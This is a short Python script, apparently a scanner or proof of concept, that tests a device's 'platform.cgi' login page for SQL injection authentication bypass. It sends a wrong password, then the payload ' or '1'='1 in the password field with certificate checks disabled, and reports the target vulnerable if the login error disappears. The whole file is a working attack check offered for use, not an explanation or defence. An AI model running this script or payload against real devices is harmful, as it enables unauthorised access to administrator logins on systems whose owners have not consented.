import requests,re,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r1=randomLowercase(8)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"platform.cgi"
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded',
	}
	body=f'thispage=index.html&Users.UserName=admin&Users.Password=1231231&button.login.Users.dashboard=Login&Login.userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A108.0%29+Gecko%2F20100101+Firefox%2F108.0&loggedInStatus='
	response=requests.post(url, body,headers=headers,verify=False,timeout=5)
	if "Invalid username or password" in response.text:
		s0=True
	else:
		s0=False
	url=baseurl+"platform.cgi"
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded',
	}
	body=f'thispage=index.html&Users.UserName=admin&Users.Password=%27+or+%271%27%3D%271&button.login.Users.dashboard=Login&Login.userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A108.0%29+Gecko%2F20100101+Firefox%2F108.0&loggedInStatus='
	response=requests.post(url, body,headers=headers,verify=False,timeout=5)
	if "Invalid username or password" not in response.text:
		s1=True
	else:
		s1=False
	if s0 and s1:
		return True
	else:
		return False
